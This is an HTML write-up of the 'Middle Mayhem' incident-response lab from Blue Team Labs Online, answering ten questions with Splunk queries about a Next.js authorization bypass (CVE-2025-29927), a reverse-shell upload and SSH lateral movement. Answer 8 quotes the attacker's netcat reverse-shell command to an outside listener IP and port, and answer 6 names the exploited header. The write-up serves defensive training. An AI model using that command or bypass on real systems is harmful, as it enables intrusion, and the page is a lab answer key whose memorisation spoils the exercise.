@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="ctf-title" content="Middle Mayhem">
+    <meta name="ctf-status" content="Retired">
+    <meta name="ctf-pass-hash" content="">
+    <meta name="ctf-platform" content="Blue Team Labs Online">
+    <meta name="ctf-difficulty" content="Easy">
+    <meta name="ctf-category" content="Incident Response">
+    <meta name="ctf-description" content="">
+    <meta name="ctf-tags" content="#NextJS #Splunk">
+    <title>Middle Mayhem</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body class="bg-slate-950 text-slate-200 font-sans antialiased selection:bg-cyan-500 selection:text-slate-950">
+    <main class="max-w-4xl mx-auto px-4 py-12 sm:px-6 lg:px-8">
+        <a href="../index.html#writeups" class="inline-flex items-center gap-2 text-slate-400 hover:text-cyan-400 text-sm font-mono mb-8 transition-colors">
+            <i class="fa-solid fa-arrow-left text-xs"></i> Back to Portfolio
+        </a>
+        <article class="prose prose-invert max-w-none space-y-6">
+            <div class="max-w-5xl mx-auto px-4 py-8">
+    <p class="font-mono text-xs text-slate-500 uppercase tracking-widest mb-2">// BLUE TEAM LABS ONLINE · WRITEUP</p>
+    <h1 class="text-4xl sm:text-5xl font-bold text-slate-100 tracking-tight mb-4">Middle Mayhem</h1>
+
+    <div class="flex flex-wrap gap-2 mb-6 font-mono text-xs font-semibold uppercase">
+        <span class="bg-cyan-950/80 text-cyan-400 border border-cyan-800/80 px-3 py-1 rounded">BLUE TEAM LABS ONLINE</span>
+        <span class="bg-slate-900 text-slate-400 border border-slate-800 px-3 py-1 rounded">EASY</span>
+        <span class="bg-slate-900 text-slate-400 border border-slate-800 px-3 py-1 rounded">INCIDENT RESPONSE</span>
+        <span class="bg-slate-900 text-slate-400 border border-slate-800 px-3 py-1 rounded">NEXTJS</span>
+        <span class="bg-slate-900 text-slate-400 border border-slate-800 px-3 py-1 rounded">SPLUNK</span>
+    </div>
+
+    <div class="flex flex-wrap items-center gap-3 my-6 font-mono text-xs">
+        <a href="../index.html#writeups" class="inline-flex items-center gap-2 bg-[#092b38] border border-cyan-800 text-cyan-400 hover:bg-cyan-900/50 px-4 py-2 rounded-lg transition-all"><i class="fa-solid fa-arrow-left text-xs"></i> BACK TO PORTFOLIO</a>
+    </div>
+
+    <div class="text-slate-300 text-sm sm:text-base leading-relaxed space-y-4 mb-8 font-sans">
+        <p>This writeup details the investigation into an incident at MiddleMayhem Inc., where unusual network traffic was detected targeting their admin portal. Utilizing SIEM logs, specifically from <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">Splunk</code>, the objective was to analyze the attack chain, identify how authentication was bypassed, remote code execution achieved, and lateral movement executed.</p>
+        <p>The analysis revealed the attacker exploited a vulnerability in the <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">Next.js</code> web application, leading to a reverse shell deployment and subsequent lateral movement to a database server via <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">SSH</code>.</p>
+    </div>
+
+    <h2 class="text-2xl font-bold text-slate-100 mb-4 font-sans">Asset Information</h2>
+    <div class="overflow-x-auto my-6 rounded-xl border border-slate-800/80 bg-[#0B1120] shadow-xl">
+        <table class="w-full text-left border-collapse text-xs font-mono">
+            <thead>
+                <tr class="border-b border-slate-800 bg-slate-900/60 text-slate-400 uppercase tracking-wider">
+                    <th class="py-3 px-4">HOSTNAME</th>
+                    <th class="py-3 px-4">SUMMARY</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr class="border-b border-slate-800/50 hover:bg-slate-800/30 transition-colors">
+                    <td class="py-3 px-4 text-cyan-400 font-semibold break-all">webapp (<code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">172.217.164.174</code>)</td>
+                    <td class="py-3 px-4 text-slate-300 break-words font-sans">The compromised web application server running <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">Next.js</code>. Initial point of compromise.</td>
+                </tr>
+                <tr class="border-b border-slate-800/50 hover:bg-slate-800/30 transition-colors">
+                    <td class="py-3 px-4 text-cyan-400 font-semibold break-all">dbserver</td>
+                    <td class="py-3 px-4 text-slate-300 break-words font-sans">Database server, target of lateral movement from the <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">webapp</code>.</td>
+                </tr>
+                <tr class="border-b border-slate-800/50 hover:bg-slate-800/30 transition-colors">
+                    <td class="py-3 px-4 text-cyan-400 font-semibold break-all">Attacker IP (<code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">218.92.0.204</code>)</td>
+                    <td class="py-3 px-4 text-slate-300 break-words font-sans">Primary IP address used by the attacker for initial reconnaissance and exploitation.</td>
+                </tr>
+                <tr class="border-b border-slate-800/50 hover:bg-slate-800/30 transition-colors">
+                    <td class="py-3 px-4 text-cyan-400 font-semibold break-all">Attacker Listener IP (<code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">113.89.232.157</code>)</td>
+                    <td class="py-3 px-4 text-slate-300 break-words font-sans">IP address where the attacker's <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">netcat</code> listener was waiting for the reverse shell connection.</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <h2 class="text-2xl font-bold text-slate-100 mb-6 font-sans">Question & Answer Solutions</h2>
+
+    <div class="bg-[#0B1120] border border-slate-800/80 rounded-xl p-6 mb-4 shadow-xl space-y-3">
+        <p class="text-slate-200 text-sm font-sans font-medium">1. Access the Website in the browser, present it in the bookmark, and identify the JavaScript framework and version used.</p>
+        <p class="text-cyan-400 font-mono text-base font-bold tracking-wide break-all">Next.js, 15.0.0</p>
+        <p class="text-slate-400 text-xs font-sans">Reasoning: By accessing the web application in a browser and opening the developer console, the command <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">window.next.version</code> revealed the framework and its version.</p>
+    </div>
+
+    <div class="bg-[#0B1120] border border-slate-800/80 rounded-xl p-6 mb-4 shadow-xl space-y-3">
+        <p class="text-slate-200 text-sm font-sans font-medium">2. Using Splunk, Find the attacker’s IP address.</p>
+        <p class="text-cyan-400 font-mono text-base font-bold tracking-wide break-all">218.92.0.204</p>
+        <p class="text-slate-400 text-xs font-sans">Reasoning: Initial reconnaissance in Splunk for unusual activity on the <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">webapp</code> host, filtering for successful HTTP responses, revealed the attacker's source IP. The query used was <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">index=* host=webapp http_response_code=200</code>, then identifying the recurring external IP.</p>
+    </div>
+
+    <div class="bg-[#0B1120] border border-slate-800/80 rounded-xl p-6 mb-4 shadow-xl space-y-3">
+        <p class="text-slate-200 text-sm font-sans font-medium">3. Analyze the SIEM logs to determine how many unique URIs were accessed by the attacker.</p>
+        <p class="text-cyan-400 font-mono text-base font-bold tracking-wide break-all">10</p>
+        <p class="text-slate-400 text-xs font-sans">Reasoning: Using Splunk, the following query was executed to count distinct URIs accessed by the attacker's IP: <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">index=* host=webapp ip_src="218.92.0.204" | stats dc(http_request_uri) as "Unique URIs Accessed"</code>.</p>
+    </div>
+
+    <div class="bg-[#0B1120] border border-slate-800/80 rounded-xl p-6 mb-4 shadow-xl space-y-3">
+        <p class="text-slate-200 text-sm font-sans font-medium">4. Explore the site and identify two specific locations that could reveal internal structures or potential access points not meant for public eyes. Provide the two relative URLs.</p>
+        <p class="text-cyan-400 font-mono text-base font-bold tracking-wide break-all">/admin, /admin/file-upload</p>
+        <p class="text-slate-400 text-xs font-sans">Reasoning: By navigating to <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">/robots.txt</code> on the web application, these sensitive paths were discovered, indicating potential administrative or file upload functionalities.</p>
+    </div>
+
+    <div class="bg-[#0B1120] border border-slate-800/80 rounded-xl p-6 mb-4 shadow-xl space-y-3">
+        <p class="text-slate-200 text-sm font-sans font-medium">5. Based on the Framework and Version, what recent CVE could be used to bypass authorization?</p>
+        <p class="text-cyan-400 font-mono text-base font-bold tracking-wide break-all">CVE-2025-29927</p>
+        <p class="text-slate-400 text-xs font-sans">Reasoning: A quick search for vulnerabilities related to <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">Next.js 15.0.0</code> revealed <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">CVE-2025-29927</code>, which is known for authorization bypass in certain configurations.</p>
+    </div>
+
+    <div class="bg-[#0B1120] border border-slate-800/80 rounded-xl p-6 mb-4 shadow-xl space-y-3">
+        <p class="text-slate-200 text-sm font-sans font-medium">6. Find the relevant HTTP header in the SIEM logs that indicates CVE exploitation. Provide the header name.</p>
+        <p class="text-cyan-400 font-mono text-base font-bold tracking-wide break-all">x-middleware-subrequest</p>
+        <p class="text-slate-400 text-xs font-sans">Reasoning: The attacker exploited the <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">Next.js</code> vulnerability by manipulating the <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">x-middleware-subrequest</code> HTTP header. This was identified in Splunk using the query <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">index=* "x-middleware-subrequest" ip_src="218.92.0.204"</code>.</p>
+    </div>
+
+    <div class="bg-[#0B1120] border border-slate-800/80 rounded-xl p-6 mb-4 shadow-xl space-y-3">
+        <p class="text-slate-200 text-sm font-sans font-medium">7. What interesting URI did the attacker access after exploiting the CVE?</p>
+        <p class="text-cyan-400 font-mono text-base font-bold tracking-wide break-all">/api/upload</p>
+        <p class="text-slate-400 text-xs font-sans">Reasoning: After successful exploitation, the attacker accessed the <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">/api/upload</code> endpoint, likely to upload a malicious payload. This was found by filtering Splunk logs for the attacker's IP and activity immediately following the CVE exploitation: <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">index=* earliest="03/24/2025:11:06:34" ip_src="218.92.0.204"</code>.</p>
+    </div>
+
+    <div class="bg-[#0B1120] border border-slate-800/80 rounded-xl p-6 mb-4 shadow-xl space-y-3">
+        <p class="text-slate-200 text-sm font-sans font-medium">8. The attacker tried uploading a reverse shell. Find out the IP and port to which the target would connect once the connection is established.</p>
+        <p class="text-cyan-400 font-mono text-base font-bold tracking-wide break-all">IP: 113.89.232.157, Port: 31337</p>
+        <p class="text-slate-400 text-xs font-sans">Reasoning: Analysis of the uploaded reverse shell payload (found via <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">index=* host=webapp http_request_method="POST"</code>) revealed the <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">netcat</code> command: <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">nc 113.89.232.157 31337</code>. This indicates the attacker's listener IP and port. Further confirmation could be found with <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">index=* host=webapp tcp_dstport=31337</code>.</p>
+    </div>
+
+    <div class="bg-[#0B1120] border border-slate-800/80 rounded-xl p-6 mb-4 shadow-xl space-y-3">
+        <p class="text-slate-200 text-sm font-sans font-medium">9. After compromising the WebApp server, the attacker attempted lateral movement. Identify the technique used, as recorded in the SIEM logs.</p>
+        <p class="text-cyan-400 font-mono text-base font-bold tracking-wide break-all">SSH Brute-Forcing / SSH Login</p>
+        <p class="text-slate-400 text-xs font-sans">Reasoning: SIEM logs from the <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">dbserver</code> showed multiple <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">pam_unix(sshd:auth): authentication failure</code> entries originating from the compromised <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">webapp</code> IP (<code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">172.217.164.174</code>), indicating an <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">SSH</code> brute-force attempt.</p>
+    </div>
+
+    <div class="bg-[#0B1120] border border-slate-800/80 rounded-xl p-6 mb-4 shadow-xl space-y-3">
+        <p class="text-slate-200 text-sm font-sans font-medium">10. Identify the user account that achieved successful lateral movement to another server.</p>
+        <p class="text-cyan-400 font-mono text-base font-bold tracking-wide break-all">dbserv</p>
+        <p class="text-slate-400 text-xs font-sans">Reasoning: Following the brute-force attempts, the <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">dbserver</code> logs explicitly stated <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">TA logs in successfully to dbserver as dbserv</code>, confirming the compromised user account for lateral movement.</p>
+    </div>
+
+    <h2 class="text-2xl font-bold text-slate-100 mb-4 font-sans">Key Takeaways & Security Insights</h2>
+    <ul class="space-y-4 text-sm text-slate-300 font-sans my-4">
+        <li class="flex items-start gap-2">
+            <span class="text-cyan-400 mt-1">•</span>
+            <div>
+                <strong class="text-cyan-400 font-semibold font-mono">Vulnerability Management:</strong>
+                Regular patching and vulnerability scanning are crucial. The exploitation of a known <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">Next.js</code> <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">CVE</code> highlights the importance of keeping web application frameworks up-to-date.
+            </div>
+        </li>
+        <li class="flex items-start gap-2">
+            <span class="text-cyan-400 mt-1">•</span>
+            <div>
+                <strong class="text-cyan-400 font-semibold font-mono">SIEM Monitoring & Alerting:</strong>
+                Effective <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">SIEM</code> rules for unusual HTTP headers (e.g., <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">x-middleware-subrequest</code> manipulation) and outbound connections to suspicious ports/IPs (e.g., <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">31337</code>) are vital for early detection of exploitation and reverse shells.
+            </div>
+        </li>
+        <li class="flex items-start gap-2">
+            <span class="text-cyan-400 mt-1">•</span>
+            <div>
+                <strong class="text-cyan-400 font-semibold font-mono">Endpoint Detection & Response (EDR):</strong>
+                An <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">EDR</code> solution could have detected the execution of the reverse shell payload (<code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">netcat</code>) and its outbound connection, providing an additional layer of defense.
+            </div>
+        </li>
+        <li class="flex items-start gap-2">
+            <span class="text-cyan-400 mt-1">•</span>
+            <div>
+                <strong class="text-cyan-400 font-semibold font-mono">Network Segmentation & Least Privilege:</strong>
+                Segmenting the <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">webapp</code> from the <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">dbserver</code> and implementing strict network access controls could have prevented or contained the lateral movement. Additionally, ensuring user accounts like <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">dbserv</code> have minimal necessary privileges reduces the impact of compromise.
+            </div>
+        </li>
+        <li class="flex items-start gap-2">
+            <span class="text-cyan-400 mt-1">•</span>
+            <div>
+                <strong class="text-cyan-400 font-semibold font-mono">Secure Configuration:</strong>
+                The presence of sensitive paths like <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">/admin</code> and <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">/admin/file-upload</code> exposed via <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">robots.txt</code> highlights the need for careful web server and application configuration to avoid unintentional information disclosure.
+            </div>
+        </li>
+    </ul>
+</div>
+        </article>
+    </main>
+</body>
+</html>
